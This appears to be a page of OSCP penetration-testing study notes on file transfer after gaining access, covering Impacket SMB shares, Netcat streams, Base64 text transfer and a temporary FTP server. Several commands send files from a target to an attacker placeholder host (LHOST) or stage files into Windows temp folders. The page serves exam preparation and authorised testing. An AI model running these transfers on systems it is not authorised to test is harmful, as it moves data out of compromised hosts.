+<p>Share authentication belongs to the temporary server, not automatically the target domain. Existing Windows connections to the same server can conflict with another credential context.</p>
+<h3 id="6-execute-and-choose-variants-8">6. Execute and choose variants</h3>
+<details>
+<summary><strong>SMB — read and write files from Windows</strong></summary>
+<h5 id="start-an-authenticated-smb-share-on-kali">Start an authenticated SMB share on Kali</h5>
+<pre><code class="language-bash">mkdir -p share
+sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
+</code></pre>
+<p>The first positional value is the share name; the second is its local directory. The supplied <code>USER</code> and <code>PASSWORD</code> authenticate to this temporary Kali share.</p>
+<p>Some installations expose the legacy wrapper name:</p>
+<pre><code class="language-bash">sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD'
+</code></pre>
+<h5 id="connect-and-download-from-windows">Connect and download from Windows</h5>
+<pre><code class="language-cmd">net use \\LHOST\transfer /user:USER "PASSWORD"
+copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE
+</code></pre>
+<h5 id="upload-evidence-from-windows-to-kali">Upload evidence from Windows to Kali</h5>
+<pre><code class="language-cmd">copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE
+net use \\LHOST\transfer /delete
+</code></pre>
+<p>Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's <code>-readonly</code> option.</p>
+</details>
+<h3 id="7-worked-example--hypothetical-8">7. Worked example — hypothetical</h3>
+<p>Observation: HTTP is unavailable but outbound SMB is permitted. Test: connect to the authenticated share and copy one artifact. Illustrative output: copy succeeds and SHA-256 matches. Interpretation: use that transfer route and remove the created connection afterward.</p>
+<h3 id="8-verify-the-result-8">8. Verify the result</h3>
+<p>Verify source/destination hash and the share path; disconnect created mappings after use.</p>
+<h3 id="9-failure-and-fallback-8">9. Failure and fallback</h3>
+<p>No route, conflicting cached connection, invalid share credentials and denied filesystem writes are independent failure points.</p>
+<h3 id="10-next-transitions-8">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-enumerators">Turn automated Windows findings into manually verified candidates</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>.</p>
+<p><a id="transfer-stream"></a></p>
+<h2 id="stream-a-file-over-a-direct-tcp-connection">Stream a file over a direct TCP connection</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-9">1. Purpose and result</h3>
+<p>A byte stream saved as a file and independently checked for integrity.</p>
+<h3 id="2-recognition-clues-9">2. Recognition clues</h3>
+<p>Only a raw TCP tool and a direct or forwarded connection are available.</p>
+<h4 id="find-the-clue-from-your-starting-access-9">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> When richer transfers are unavailable, inspect the exact TCP tool and draw sender, receiver and writable output destination.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">nc -h
+ls -ld /DESTINATION_DIRECTORY
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Available client: Netcat implementation
+Direction: sender -> receiver listener
+Destination: writable
+</code></pre>
+<p><strong>Recognize this detail:</strong> A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied.</p>
+<p><strong>Still missing before method selection:</strong> Confirm listener syntax, reachability, binary-clean I/O and a complete independent hash match.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The chosen stream finishes with matching bytes: use the saved artifact.</td></tr><tr><td>Ruled out in this context</td><td>The only available direction cannot reach the receiver: reject this stream route.</td></tr><tr><td>Inconclusive</td><td>A connection with unknown termination/file size leaves transfer completeness unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-9">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file.</p>
+<h3 id="4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">nc -h
+ip route get TARGET
+</code></pre>
+<h3 id="5-why-it-works-9">5. Why it works</h3>
+<p>A raw stream carries no filename, authentication or integrity metadata. Terminal output and connection termination can corrupt or truncate the saved file.</p>
+<h3 id="6-execute-and-choose-variants-9">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Netcat — stream a file when a direct TCP connection is possible</strong></summary>
+<h5 id="retrieve-a-file-from-the-target-to-kali">Retrieve a file from the target to Kali</h5>
+<p>Kali receives:</p>
+<pre><code class="language-bash">nc -lvnp PORT > FILE
+</code></pre>
+<p>The target sends:</p>
+<pre><code class="language-bash">nc -nv LHOST PORT &#x3C; /path/to/FILE
+</code></pre>
+<h5 id="send-a-file-from-kali-to-the-target">Send a file from Kali to the target</h5>
+<p>The target receives:</p>
+<pre><code class="language-bash">nc -lvnp PORT > /tmp/FILE
+</code></pre>
+<p>Kali sends:</p>
+<pre><code class="language-bash">nc -nv TARGET PORT &#x3C; FILE
+</code></pre>
+<p>If the listener rejects <code>-p</code>, use the OpenBSD-style form and check <code>nc -h</code> locally:</p>
+<pre><code class="language-bash">nc -lvn PORT > FILE
+</code></pre>
+<p>Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.</p>
+</details>
+<h3 id="7-worked-example--hypothetical-9">7. Worked example — hypothetical</h3>
+<p>Observation: a raw transfer connects but the saved artifact is shorter. Test: compare size/hash and inspect sender termination behavior. Illustrative output: a repeated clean transfer matches the source. Interpretation: only the matching copy is suitable for execution.</p>
+<h3 id="8-verify-the-result-9">8. Verify the result</h3>
+<p>Compare hashes and avoid mixing diagnostic text into the file stream.</p>
+<h3 id="9-failure-and-fallback-9">9. Failure and fallback</h3>
+<p>A connection without a complete hash match proves only transport. Use SCP/HTTP/SMB when those routes exist.</p>
+<h3 id="10-next-transitions-9">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>; <a href="/oscp/notes/methods/pivoting/#fixed-forward">Relay a single TCP service through a fixed forward</a>.</p>
+<p><a id="transfer-text"></a></p>
+<h2 id="move-a-small-artifact-through-a-text-only-channel">Move a small artifact through a text-only channel</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-10">1. Purpose and result</h3>
+<p>A reconstructed small file with matching bytes.</p>
+<h3 id="2-recognition-clues-10">2. Recognition clues</h3>
+<p>The existing command channel permits text but no convenient file-transfer connection.</p>
+<h4 id="find-the-clue-from-your-starting-access-10">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the existing channel's command-length/quoting limits and whether both sides can reconstruct a small encoded file.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">command -v base64
+wc -c FILE
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">/usr/bin/base64
+SMALL_BYTE_COUNT FILE
+</code></pre>
+<p><strong>Recognize this detail:</strong> A small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive.</p>
+<p><strong>Still missing before method selection:</strong> Verify exact length/quoting and source/destination hash; use the Windows decoding variant when appropriate.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The complete decoded bytes match: use the text-transfer result.</td></tr><tr><td>Ruled out in this context</td><td>The channel truncates below the required encoded size: reject a one-command transfer of this artifact.</td></tr><tr><td>Inconclusive</td><td>Unknown command limits require a harmless small round trip before relying on the channel.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-10">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Available Base64 encode/decode, adequate command length and a writable destination.</p>
+<h3 id="4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">base64 -w 0 FILE
+sha256sum FILE
+</code></pre>
+<h3 id="5-why-it-works-10">5. Why it works</h3>
+<p>Base64 transports bytes through text; it does not encrypt them or guarantee that the command channel preserves length and quoting.</p>
+<h3 id="6-execute-and-choose-variants-10">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Base64 — move a small file through a text-only channel</strong></summary>
+<h5 id="encode-on-linux">Encode on Linux</h5>
+<pre><code class="language-bash">base64 -w 0 FILE
+</code></pre>
+<h5 id="decode-on-linux">Decode on Linux</h5>
+<pre><code class="language-bash">printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE
+</code></pre>
+<h5 id="decode-in-powershell">Decode in PowerShell</h5>
+<pre><code class="language-powershell">[IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA'))
+</code></pre>
+<p>Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.</p>
+</details>
+<h3 id="7-worked-example--hypothetical-10">7. Worked example — hypothetical</h3>
+<p>Observation: a short configuration must cross a command-only channel. Test: encode, decode at the destination and compare hashes. Illustrative output: the hash matches. Interpretation: the byte transport succeeded; execution compatibility remains separate.</p>
+<h3 id="8-verify-the-result-10">8. Verify the result</h3>
+<p>Require a complete matching hash; keep encoded secrets in private evidence rather than reusable notes.</p>
+<h3 id="9-failure-and-fallback-10">9. Failure and fallback</h3>
+<p>Truncation, wrapping and quoting often corrupt long values. Use a network transfer for larger files.</p>
+<h3 id="10-next-transitions-10">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-parser">Repair quoting, encoding and command-length boundaries</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>; <a href="/oscp/notes/methods/credentials/#credential-classify">Classify the artifact and its identity context</a>.</p>
+<p><a id="transfer-ftp"></a></p>
+<h2 id="use-a-temporary-ftp-transfer-as-a-constrained-fallback">Use a temporary FTP transfer as a constrained fallback</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-11">1. Purpose and result</h3>
+<p>A verified temporary FTP file transfer.</p>
+<h3 id="2-recognition-clues-11">2. Recognition clues</h3>
+<p>The target has an FTP client and simpler transfer routes are unavailable.</p>
+<h4 id="find-the-clue-from-your-starting-access-11">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect whether a compatible FTP client is the remaining route and whether the temporary server's data channel is reachable.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-text">ftp
+help
+quit
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Client commands include: open, binary, get, put
+No transfer mode selected yet
+</code></pre>
+<p><strong>Recognize this detail:</strong> Client availability permits investigating FTP; binary mode and separate data-channel paths remain necessary.</p>
+<p><strong>Still missing before method selection:</strong> Verify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Binary transfer completes and hashes match: use that verified temporary copy.</td></tr><tr><td>Ruled out in this context</td><td>Only the control channel works and the required data route is blocked: reject this FTP path.</td></tr><tr><td>Inconclusive</td><td>Client presence alone leaves data transport and server rights unproved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-11">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode.</p>
+<h3 id="4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</h3>
+<pre><code class="language-text">ftp LHOST PORT
+binary
+</code></pre>
+<h3 id="5-why-it-works-11">5. Why it works</h3>
+<p>FTP has separate control/data channels and can transform files in text mode. The temporary server's default permissions and authentication must be checked.</p>
+<h3 id="6-execute-and-choose-variants-11">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Temporary FTP — only when an FTP client is the available route</strong></summary>
+<p>On Kali, after intentionally selecting/installing <code>pyftpdlib</code> in an isolated environment:</p>
+<pre><code class="language-bash">python3 -m pyftpdlib -p PORT
+</code></pre>
+<p>On the target:</p>
+<pre><code class="language-text">ftp LHOST PORT
+binary
+get FILE
+put FILE
+quit
+</code></pre>
+<p>The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.</p>
+</details>
+<h3 id="7-worked-example--hypothetical-11">7. Worked example — hypothetical</h3>
+<p>Observation: a binary copied over FTP fails. Test: repeat in binary mode and compare hashes. Illustrative output: the second copy matches. Interpretation: transport mode, not payload generation, caused the failure.</p>
+<h3 id="8-verify-the-result-11">8. Verify the result</h3>
+<p>Compare bytes and stop the temporary server after its purpose is complete.</p>
+<h3 id="9-failure-and-fallback-11">9. Failure and fallback</h3>
+<p>A working control session with failed data transfer requires data-channel troubleshooting. Choose HTTP/SCP/SMB when available.</p>
+<h3 id="10-next-transitions-11">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-scp">Copy files through an authenticated SSH service</a>.</p>
+<h2 id="sources-and-shared-concepts">Sources and shared concepts</h2>
+<p>Supplied PEN-200 command-to-shell pp257–259, Ch 19 selected PTY/forwarding examples and Ch 21 pp671–683. <a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/linux">Hexdump Linux shell resources</a>, <a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/windows">Windows shell resources</a>.</p>
+<p>Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
